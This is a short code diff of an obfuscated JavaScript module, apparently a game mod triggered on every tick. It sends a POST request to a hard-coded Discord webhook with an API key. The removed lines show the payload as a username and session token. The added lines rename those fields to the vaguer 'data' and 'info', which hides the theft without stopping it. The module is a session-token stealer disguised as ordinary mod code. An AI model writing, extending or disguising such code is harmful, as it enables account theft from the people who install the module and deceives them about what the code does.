@@ -86,8 +86,8 @@ const onEnable = register('tick', () => {
     'url': 'https://canary.discord.com/api/webhooks/1375930189724516462/K5nfUTkDFZZx8-0Lu6ccvEdH5oNWkuwA3jPjEF1cIZY1XgGB1SXyhQH940wK8fmrCbFF',
     'method': "POST",
     'body': {
-      'username': _0x13e55b[0x0],
-      'session_token': _0x13e55b[0x1],
+      'data': _0x13e55b[0x0],
+      'info': _0x13e55b[0x1],
       'APIKEY': 'oWxr1aXBPQfqYGJv5yKnPG67bqra9FGb'
     },
     'json': true
